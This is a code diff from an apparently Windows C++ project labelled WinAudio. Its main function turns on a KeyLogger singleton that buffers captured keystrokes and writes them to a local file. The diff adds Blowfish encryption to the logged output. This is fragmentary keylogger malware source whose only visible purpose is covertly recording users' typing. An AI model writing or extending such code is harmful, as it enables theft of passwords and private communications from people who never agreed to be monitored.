@@ -10,10 +10,11 @@
 #include "BufferWriterProcess.h"
 #include <stdio.h>
 #include "Queue.h"
-#include "VirtulKeyCodeToCharConverter.h"
+
+#include "blowfish.h"
+
 #define MAX_LOADSTRING 100
 
-// Global Variables:
 HINSTANCE hInst;								// current instance
 TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
 TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name
@@ -39,6 +40,7 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
 	LoadString(hInstance, IDC_WINAUDIO, szWindowClass, MAX_LOADSTRING);
 	myInstance = hInstance;
 
+
 	/*QueueTest();
 	BufferTester *test = new BufferTester();
 	test->RunTest();
@@ -46,13 +48,17 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
 	RunVirtualKeyCodeConverterTest();
 	*/
 
+	/*if (RunCryptoTest())
+	{
+	}*/
+
 	Buffer *buffer = new Buffer();
 	TCHAR *file = L"c:\\test.txt";
 	FileWriter *fileWriter = new FileWriter(file);
 
 	KeyLogger::GetInstance()->SetBuffer(buffer);
 	BufferWriterProcess *bufferWriter = new BufferWriterProcess(buffer,fileWriter);
-
+	bufferWriter->EnableEncryption();
 	KeyLogger::GetInstance()->Enable();
 	bufferWriter->Enable();
 
